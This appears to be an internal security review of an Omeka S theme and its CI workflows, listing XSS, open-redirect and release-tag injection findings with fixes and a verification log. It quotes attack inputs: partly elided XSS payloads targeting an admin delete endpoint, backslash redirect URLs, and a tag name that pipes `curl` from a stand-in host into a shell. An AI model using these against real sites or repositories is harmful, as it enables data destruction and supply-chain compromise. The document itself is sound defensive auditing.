# Security review — October 2026 (backlog #9)

Date: 2026-10-24. Branch: `hotfix/security-review`, based on `origin/master` at `5d08d16`.
Scope: the REA ATE theme source (`view/`, `helper/`, `asset/js/`), its CI and supply
chain (`.github/workflows/`, `package*.json`, `composer.*`), and the state of phases 2–4
of the 2026-07-21 audit (OWASP ASVS 4.0 L2, ENS). This document does not rewrite the
July audit; it rechecks it against current code and records what changed.

Line references marked *(master)* point at `origin/master` before this branch; the
others point at this branch.

## Threat context that sets severity

- `view/omeka/site/item/show.phtml:254-258` and `view/omeka/site/item/browse.phtml:404-408`
  render a valid admin `confirmform_csrf` token into public pages for users who may delete
  items, and `asset/js/script.js:143-146` posts it to `/admin/item/{id}/delete`. Any script
  execution on those pages, in the session of an editor, can therefore delete items.
  Stored XSS in catalogue metadata is rated **High** for that reason.
- Catalogue metadata (titles, values, value language tags, media titles) is written by
  every role that can create or edit items (Author upward), and through the REST API.
  Omeka core does not validate value language tags: `Omeka\DataType\Literal::hydrate()`
  stores `@language` verbatim.

## Findings

| ID | Severity | Location | Summary | Status |
|---|---|---|---|---|
| SR-01 | High | `view/omeka/site/item/show.phtml:130-131` *(master)* | JSON-LD `<script>` breakout from any item metadata | Fixed |
| SR-02 | High | `view/common/block-layout/item-with-metadata.phtml:21,34,43` *(master)* | Item title and title language unescaped | Fixed |
| SR-03 | High | `view/common/resource-values.phtml:71` *(master)* | Value language tag unescaped | Fixed |
| SR-04 | High | `view/common/block-layout/file.phtml:45`, `item-showcase.phtml:30` *(master)* | Media title unescaped | Fixed |
| SR-05 | Medium | `helper/SafeUrl.php:60` *(master)* | Backslash variants of protocol-relative URLs accepted | Fixed |
| SR-06 | Medium | `.github/workflows/release.yml:28-29,59` *(master)* | Tag name interpolated into shell | Fixed |
| SR-07 | Low | `.github/workflows/release.yml:42-44` *(master)* | Fixed `EOF` delimiter for `$GITHUB_OUTPUT` | Fixed |
| SR-08 | Low | `.github/workflows/release.yml:47-50` *(master)* | npm cache restored in the publishing job | Fixed |
| SR-09 | Medium | `.github/workflows/ci.yml` *(master)* | No `permissions:` block | Fixed |
| SR-10 | Low | `.github/workflows/ci.yml:43-47` *(master)* | CI runs `composer update`, ignoring `composer.lock` | Fixed |
| SR-11 | Low | `.github/workflows/pr-playground-preview.yml:11-13` *(master)* | Workflow-wide `pull-requests: write` | Fixed |
| SR-12 | Low | `.github/workflows/*.yml` | Credentials persisted by `actions/checkout` | Fixed |
| SR-13 | Low | `ci.yml:57`, `release.yml:49` *(master)* | Node.js 20 is past end of life | Fixed |
| SR-14 | Info | all workflows | Actions on version tags, not SHAs | Accepted risk |
| SR-15 | Medium | `view/layout/layout.phtml:49-50` | Google Fonts loaded from a third party | Planned (phase 2) |
| SR-16 | Medium | instance | No CSP or security headers | Planned (phase 2) |
| SR-17 | Low | `view/common/block-layout/file.phtml:49`, `item-showcase.phtml:39` | Block captions echoed as raw HTML | Accepted risk |
| SR-18 | Low | `view/omeka/site/item/show.phtml:246-258` | Admin CSRF token in public DOM | Accepted risk, planned |
| SR-19 | Info | Omeka core `Uri` data type | URI values only block `javascript:` | Accepted risk (upstream) |

### SR-01 — JSON-LD script breakout (High, fixed)

`show.phtml` builds a schema.org object from the item (title, description, creator,
publisher, keywords, educational values, project name) and passes
`json_encode(..., JSON_UNESCAPED_SLASHES)` to `headScript()->appendScript(...,
'application/ld+json')`. Laminas `HeadScript::itemToString()` prints the source verbatim,
and `json_encode` without `JSON_HEX_TAG` leaves `<` and `>` intact.

Exploit: an Author sets an item's `dcterms:title` to
`</script><script>fetch('/admin/item/'+N+'/delete',…)</script>`. Every visit to the
item's public page executes it; for an editor, the script reads the CSRF token from
`#delete-confirm-modal` and deletes items. Reproduced offline:

```
before: {"name":"</script><script>alert(1)</script>"}
after:  {"name":"</script><script>alert(1)</script>"}
json_decode(after) == input: true
```

Fix: `JSON_HEX_TAG | JSON_HEX_AMP` added (`show.phtml:135`). JSON-LD consumers decode
the `<` escapes back to the same string, so the structured data is unchanged.

### SR-02 — item-with-metadata block title (High, fixed)

`$title = $item->displayTitle()` was concatenated with `'<span class="language">' .
$titleLang . '</span>'` and echoed raw inside `<h3>`. Both the title and the language tag
are metadata. Exploit: a site page with an "Item with metadata" block attached to an item
titled `<img src=x onerror=…>` runs the payload for every visitor of that page. Fix:
both parts are escaped before concatenation (`item-with-metadata.phtml:23,36`). The same
lines also guard a null `$titleObj`; without the guard, an item whose title comes from a
fallback property caused a fatal error.

### SR-03 — value language tag (High, fixed)

`resource-values.phtml` already escaped `$valueLang` in the `lang=""` attribute but echoed
it raw in `<span class="language">`. `show_locale_label` defaults to on. Exploit:
`POST /api/items` (or the admin form) with a literal whose `@language` is
`<svg onload=…>`; the payload runs on the item page next to the CSRF token. Omeka core's
template has the same line; this theme overrides it, so the fix belongs here. Fix:
`resource-values.phtml:71`. `view/search/results.phtml:154` was already correct.

### SR-04 — media title in file and item-showcase blocks (High, fixed)

With the "file name" title option, both blocks echoed `$media->displayTitle()` raw. Core
Omeka escapes it (`application/view/common/block-layout/file.phtml:37`). Exploit: a media
title set to markup runs on every page that shows the block. Fix: `escapeHtml()` in
`file.phtml:45` and `item-showcase.phtml:30`.

### SR-05 — SafeUrl backslash bypass (Medium, fixed)

`SafeUrl` rejected `//host` but accepted `/\host`, `\\host` and `\/host`. The WHATWG URL
parser treats `\` as `/` in http(s) URLs, so browsers resolve all three to
`https://host/`. The same quirk makes `https://good.example\@evil.example/` point at
`good.example` in a browser, while PHP's `parse_url` reads `evil.example` as the host.
Exploit: `home-audience-rail.phtml:24` passes any value starting with `/` to `SafeUrl`,
so a theme setting `home_audience_teachers_url = /\evil.example` produces an off-site
link on the home page. This is an open redirect, not script execution. Fix: any URL that
contains a backslash is rejected (`SafeUrl.php:62`); a legitimate URL encodes it as `%5C`.
New tests in `test/ReaAteTest/Helper/SafeUrlTest.php` cover four variants. `HtmlAllowlist`
uses `SafeUrl` for footer links, so those links get the same protection.

### SR-06 — Release tag injection (Medium, fixed)

`release.yml` triggers on tags `v*.*.*` and `[0-9]+.[0-9]+.[0-9]+`. The glob allows any
characters that are legal in a ref, and `git check-ref-format
'refs/tags/v1.2.3$(curl${IFS}evil.example|sh)'` accepts that tag name. The version was
interpolated with `${{ env.VERSION }}` into `run:` scripts. In particular,
`make package VERSION=${{ env.VERSION }}` is unquoted, so `$(…)` in the tag ran in a job
that has `contents: write` and builds the published ZIP. Pushing a tag already requires
write access, so this risk comes from an insider or a stolen token: the attack is hidden
in a tag name and can bypass tag rulesets. It is not reachable by outside contributors.
Fix: the tag is validated against `^[0-9]+\.[0-9]+\.[0-9]+$` after stripping `v`, and the
job fails otherwise. Every `run:` step uses the shell variable `"${VERSION}"`. `${{ }}`
remains only in `with:` inputs, which are not evaluated by a shell.

### SR-07 — fixed heredoc delimiter (Low, fixed)

The release notes are `git log` subjects written to `$GITHUB_OUTPUT` between `notes<<EOF`
and `EOF`. A commit whose subject is exactly `EOF` ends the value early, and the lines
that follow it can define other step outputs. Fix: random delimiter
`NOTES_$(openssl rand -hex 16)`; `${PREVIOUS_TAG}..HEAD` is now quoted.

### SR-08 — dependency cache in the publishing job (Low, fixed)

zizmor `cache-poisoning`: the release job restored the npm cache with `cache: 'npm'`, and
its output is the released ZIP. Fix: `package-manager-cache: false` in `release.yml`
(documented `actions/setup-node@v7` input). The `ci.yml` build job keeps its cache: it
publishes nothing, and tag runs cannot restore branch-scoped caches.

### SR-09 — CI token scope (Medium, fixed)

`ci.yml` had no `permissions:` block, so its token got the repository default, which may
be read/write. Fix: `permissions: contents: read`. `release.yml` and
`pr-playground-preview.yml` now declare `permissions: {}` at the top level and grant
scopes per job.

### SR-10 — CI did not test the locked dependencies (Low, fixed)

`ci.yml` ran `make lint` and `make test`. Both depend on `deps-update`, which runs
`composer update --with-dependencies` whenever something is outdated, and
`composer.json` requires `"*"`. CI therefore tested whatever versions were newest that
day and ignored `composer.lock`. Fix: CI calls `vendor/bin/phpcs` (the same arguments as
`Makefile:80`) and `vendor/bin/phpunit -c test/phpunit.xml` directly. The Makefile is
unchanged.

### SR-11 — playground preview permissions (Low, fixed)

The July audit's item "third-party action on `@main` with `pull-requests: write`" no
longer applies. `pr-playground-preview.yml` uses
`ateeducacion/action-omeka-s-playground-pr-preview@v1`, an action from the same
organisation on a version tag, under the `pull_request` trigger, not
`pull_request_target`. Fork PRs therefore get a read-only token and no secrets. Its only
`${{ }}` values are `github.repository` and `head.sha`, which an attacker cannot inject
into. Residual: the write scope was declared for the whole workflow. Fix: moved to the
job.

### SR-12 — persisted checkout credentials (Low, fixed)

`persist-credentials: false` is set on every checkout. No job pushes with git; the
release goes through the action's token input. `update-agent-skills.yml` was already
hardened (`permissions: {}`, per-job scopes, `persist-credentials: false`) and is
unchanged.

### SR-13 — Node.js 20 end of life (Low, fixed)

Node.js 20 left support on 2026-04-30. CI and the release job now use Node.js 24 (LTS).
`npm ci && npm run build` passes locally (Node 26), and the compiled CSS does not change.
The rest of the July finding that "the npm toolchain was outdated" has since been
resolved: `npm outdated` lists only `sass` 1.105.2 → 1.106.1 (minor) and
`gettext-parser` 9 → 10 (major, a dev dependency). `npm audit` and `composer audit`
report nothing.

### SR-14 — version tags instead of SHAs (Info, accepted risk)

zizmor reports 12 `unpinned-uses`, and the vendored `github-actions-hardening` skill
advises SHA pinning. The maintainer's preference in `AGENTS.md` overrides it: use version
tags (`actions/checkout@v7`, `peter-evans/create-pull-request@v8`, and so on). Dependabot
already updates `github-actions` weekly. The highest-exposure third-party references are
`softprops/action-gh-release@v3` (runs with `contents: write` in the release job) and
`devantler-tech/actions/update-agent-skills` (runs with `contents`/`pull-requests:
write`). They are the first candidates if this policy is revisited.

### SR-15 — third-party fonts (Medium, planned)

`layout.phtml:49-50` loads Inter and Material Symbols from `fonts.googleapis.com` on
every page. Each visit sends the visitor's IP address to Google without consent
(LG München I, 3 O 17493/20, 2022). This also blocks a strict `font-src`/`style-src`
policy. See the phase 2 plan.

### SR-16 — no CSP or security headers (Medium, planned)

GET requests to the local instance (`curl -sI http://localhost:8080/`) return none of
`Content-Security-Policy`, `X-Content-Type-Options`, `Referrer-Policy`,
`X-Frame-Options`/`frame-ancestors`, `Permissions-Policy` or HSTS. The session cookie is
`HttpOnly` without `Secure` or `SameSite` (local HTTP instance). `X-Powered-By:
PHP/8.4.17` is exposed. See the phase 2 and phase 4 plans.

### SR-17 — raw block captions (Low, accepted risk)

`file.phtml:49` and `item-showcase.phtml:39` echo `$attachment->caption()` raw. Core
Omeka does the same: the caption is HTML from the page editor, and only site editors can
author it. Accepted, with the same reasoning core uses. If the ENS profile treats site
editors as untrusted, as the footer `HtmlAllowlist` decision did, route captions through
`HtmlAllowlist` as well.

### SR-18 — admin CSRF token on public pages (Low, accepted risk, planned)

This is unchanged since July and remains the multiplier behind every High above. The
token is the shared `confirmform_csrf` session token, so one token deletes any item.
Plan: replace the in-page delete with a link to the admin confirmation page
(`/admin/item/{id}/delete-confirm`), or fetch the token from an admin endpoint only when
the user confirms. Either removes the token from the public DOM.

### SR-19 — URI values (Info, accepted risk, upstream)

The theme prints URI values through core `ValueRepresentation::asHtml()`. Core
`Uri::uriIsValid()` rejects only `javascript:` after removing tab, CR and LF characters.
Other dangerous schemes (`data:`, `vbscript:`) are inert or blocked for top-level
navigation in current browsers. The theme's own URI sinks (license, project logo and
URL) already go through `SafeUrl` or `LicenseBadge`. Report upstream instead of forking
the data type.

## Phase 0/1 regression check

Rechecked in all current templates, helpers and JS, including code added since July:

- **New code is clean.** `helper/CurriculumAnchor.php` builds URLs only with the router;
  its templates `curriculum-anchor.phtml` and `curriculum-anchor-card.phtml` escape every
  label, description and URL; the generated tooltip ids are counters.
  `helper/LicenseBadge.php` matches against a fixed allowlist and emits a canonical
  `https://` URI and fixed image names. `view/common/project-funding.phtml` passes the
  logo and URL through `SafeUrl` and escapes text. `block.phtml:12` validates
  `anclaje_div_class` with `CssToken::cssClass`. The `valueResource()` changes from
  #53/#54 add no output sinks.
- **CSS sinks.** `layout.phtml` validates the colour, `header_layout` and
  `banner_height_mobile` settings; `banner.phtml` validates `banner_height` and the
  position and width keywords. `ResourceTags` styles are computed values.
- **HTML sinks.** All three footer `HtmlTextarea` settings go through `HtmlAllowlist`,
  which still keeps `target` and `rel`.
- **JS sinks.** Theme JS (excluding `minimasonry.min.js`) has no `innerHTML`,
  `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval` or jQuery `.html()`.
  `advanced-search-list.js:433` `safeHref` limits chip links to same-origin http(s). The
  `resource-link-info.js` Content-Type guard still accepts `application/ld+json`.
- **Gaps found:** SR-01 to SR-05. All four XSS sinks are older code that the July pass
  missed: the JSON-LD block and three block or partial templates inherited from the
  upstream theme.

## Phase 2 plan — CSP, inline code, fonts, headers

Current blockers for a CSP without `'unsafe-inline'`:

| Source | Inline code | Move to |
|---|---|---|
| `view/common/user-bar.phtml:15-31` | logout click handler | `asset/js/script.js`, bound by `#logout-button` |
| `view/common/menu-drawer.phtml:38-41` | `closeText`/`previousText` globals | `data-close-text`/`data-previous-text` on `#menu-drawer`, read in `navigation.js` |
| `view/common/advanced-search/item-sets.phtml:74-84` | jQuery delegate | new `asset/js/advanced-search-item-sets.js` via `headScript()->appendFile` |
| `view/omeka/site/item-set/_browse-filter-script.phtml` | filter IIFE | new `asset/js/item-set-filter.js` |
| `view/omeka/site/item/show.phtml:134` | JSON-LD (`application/ld+json`) | Not executable; allow it with a hash or nonce, or accept it under `script-src` |
| `view/layout/layout.phtml:72-131` | `:root` tokens from settings | Keep it as a `<style>` (values validated by `CssToken`) and allow it by hash per configuration, or move static tokens to `style.scss` and keep only the colour block inline |
| `banner.phtml:46,48`, `ResourceTags.php:57,77`, `menu-drawer.phtml:13`, `search/search.phtml:244` | `style=""` attributes | Classes or CSS custom properties set from JS; `style-src-attr` needs `'unsafe-inline'` until then |

Constraints and order:

1. Omeka core and modules also emit inline scripts: `jsTranslate()` (`layout.phtml:53`),
   AdvancedSearch, Mapping. Omeka S 4.2 has no per-request nonce API for themes. The
   achievable target is therefore `script-src 'self' 'unsafe-inline'` hardened by the
   other directives. Removing `'unsafe-inline'` would need a module that adds nonces.
   Moving the four theme scripts is still worth doing: it shrinks the theme's own
   surface and is a prerequisite.
2. Self-host the fonts (SR-15). Add Inter (woff2, latin and latin-ext, 400–800) and a
   **subset** of Material Symbols Outlined limited to the icons the theme uses
   (`grep -rho 'material-symbols-outlined[^>]*>[a-z_]*' view`). Load them from
   `asset/fonts/` through `@font-face` in Sass, and remove both `prependStylesheet` calls.
   Then `font-src 'self'` and `style-src 'self' 'unsafe-inline'`.
3. Deploy the policy as `Content-Security-Policy-Report-Only` at the web server first:
   `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self'
   'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self';
   frame-src 'self' <SCORM/H5P/oEmbed hosts>; frame-ancestors 'self'; base-uri 'self';
   form-action 'self'; object-src 'none'`. Collect violations from real pages (item,
   search with Mapping, SCORM media) for two weeks, then enforce it.
4. Headers belong at the web server, not in the theme: `X-Content-Type-Options: nosniff`,
   `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(),
   microphone=(), geolocation=()`, `frame-ancestors` in the CSP, and
   `fastcgi_hide_header X-Powered-By` / `expose_php = Off`.

Nothing from phase 2 is implemented in this branch. The first step, moving the four
scripts, touches four files and their JS. Each needs a browser check of the menu drawer,
logout, item-set filter and advanced-search item-set selector, which this review could
not run (see Verification).

## Phase 4 recommendations — Omeka S instance (not implemented)

1. **Public API.** `GET /api/items` is public (HTTP 200 locally); `/api/users` is
   correctly denied (403). Decide what the API should expose. `resource-link-info.js` and
   the playground depend on `/api/items`. Closing the API, as architect decision notes
   expect, needs that script to switch to a server-rendered endpoint first. At minimum,
   rate-limit `/api/` at the proxy.
2. **Transport and cookies.** In production, HTTPS only with
   `Strict-Transport-Security: max-age=31536000; includeSubDomains`, and session cookies
   with `Secure`, `HttpOnly` and `SameSite=Lax`. Set them in `config/local.config.php`
   (`session` → `config` → `cookie_secure`, `cookie_samesite`) or in `php.ini`.
3. **Authentication.** Enable 2FA for every admin and editor account (for example the
   TwoFactorAuth module), with a password policy aligned with ENS `op.acc.5`.
   Lock out repeated failed logins at the proxy (`/login`).
4. **Roles.** Because of SR-18, give the Author role only to trusted catalogue staff, and
   review who holds Editor or Site Admin, since those roles can author raw HTML (block
   captions, the HTML block).
5. **Embedded content.** Serve SCORM, H5P and uploaded HTML packages from a separate
   origin, or wrap them in `<iframe sandbox="allow-scripts allow-forms">` without
   `allow-same-origin`. Same-origin package content can read the CSRF token and the
   session. Restrict `frame-src` accordingly.
6. **Uploads.** Keep the Omeka media-type and extension allowlists strict. Serve
   `/files/` with `X-Content-Type-Options: nosniff` and
   `Content-Disposition: attachment` for HTML and SVG, or from a cookieless origin.
7. **Information disclosure.** Hide `X-Powered-By` and the nginx version
   (`server_tokens off`), and keep `APPLICATION_ENV` at `production`.

## Verification

Commands run in the worktree on 2026-10-24, with their real results:

| Command | Result |
|---|---|
| `composer install --no-interaction --prefer-dist` | installed from lock |
| `npm ci` | `found 0 vulnerabilities` |
| `vendor/bin/phpunit -c test/phpunit.xml` (before the change) | `OK (106 tests, 133 assertions)` |
| same, with the new `SafeUrlTest` cases and the old `SafeUrl` | 4 failures, as expected (red) |
| same, after the fix | `OK (110 tests, 137 assertions)` |
| PHPCS with the `Makefile:80` arguments | no violations (exit 0) |
| `php -l` on every changed PHP/PHTML file | no syntax errors |
| `npm audit` | `found 0 vulnerabilities` |
| `composer audit` | `No security vulnerability advisories found.` |
| `node .project/tests/api-content-type-test.js` | `14 passed, 0 failed` |
| `bash .project/tests/run-xss-harness.sh` (headless Chrome against `localhost:8080`, which serves master's JS; this branch changes no JS) | `TODO OK — 14 comprobaciones, 0 fallos` |
| `npm run build` | finished; generated CSS unchanged |
| `pipx run zizmor --offline` on the workflows (after the change) | 0 template-injection findings; 12 `unpinned-uses` (SR-14, accepted); 1 `cache-poisoning` on `ci.yml` (accepted, see SR-08); 1 info `superfluous-actions` |
| YAML parse of every workflow (Ruby `YAML.load_file`) | all four parse |
| Replay of the release version step in bash with malicious tags | `v1.2.3`, `1.2.3` accepted; `$(id)`, `;id`, backticks, `${IFS}`, `-rc1` rejected; `sed` writes `version = "1.2.3"` |
| `php -r` JSON-LD reproduction (SR-01) | breakout before, `<` escapes after, round-trips equal |
| `curl` GET requests to `localhost:8080` | headers as in SR-16; `/api/users` 403; `/api/items` 200 |

Not verified:

- **Rendering of the patched templates in Omeka.** The local container mounts the main
  checkout (master), not this worktree, and every `/s/<site>` URL returned 404 on this
  instance during the review, so no public item page could be fetched. The template fixes
  only add escaping and are syntax-checked, but runtime rendering of the
  item-with-metadata, file and item-showcase blocks and of `show.phtml` still needs a
  check after merge. The runbook (`.project/tests/security-qa.md`, section C) describes
  how to inject payloads, with backup and restore. It writes to the database, which was
  out of bounds here.
- **The workflows on GitHub.** They were linted and replayed locally only. The first tag
  push after merge will run the new `release.yml`; confirm the ZIP and the release
  notes.
- **Manual check 10** (functional non-regression in a browser) from the runbook was not
  run.

## Out of scope (for #10)

Non-security defects noticed during the review:

- `view/omeka/site/item/show.phtml:134`: Laminas `HeadScript` wraps non-`noescape`
  scripts in `//<!--` … `//-->`, which also applies to `application/ld+json`. The
  emitted JSON-LD is therefore not valid JSON, and crawlers will likely ignore it. Pass
  `['noescape' => true]` as the third argument after confirming the output.
- `view/common/block-layout/file.phtml:31`: the exception message uses the undefined
  `$linkType` (the variable is `$link`).
- `view/common/block-layout/file.phtml:45` and `item-showcase.phtml:30`: with the "file
  name" title option and an item without media, `$media` is null and `displayTitle()`
  causes a fatal error.
- `view/common/user-bar.phtml:9,14,37,41`: the `title` attributes and link texts use
  `translate()` without escaping. Translations are trusted, so this is consistency, not
  a vulnerability.
- `Makefile` `package` target: `--exclude='.claude'` is listed twice.
